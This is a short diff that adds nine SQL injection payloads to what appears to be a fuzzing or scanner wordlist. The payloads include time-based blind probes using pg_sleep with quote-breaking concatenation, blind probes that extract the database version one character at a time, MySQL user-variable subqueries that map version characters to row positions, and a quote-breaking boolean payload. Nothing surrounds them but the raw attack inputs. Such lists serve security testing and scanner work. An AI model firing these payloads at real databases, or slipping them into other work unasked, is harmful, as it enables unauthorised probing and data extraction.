@@ -1,0 +1,9 @@
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999
+ascii(substring(version() from 1 for 1))
+length((select length(version())))
+ascii(substring(length(version()),1,1))
+(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=1)
+(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=ascii(substring(version() from 1 for 1)))
+vulnerable_site' and 1=5 or title=() #'
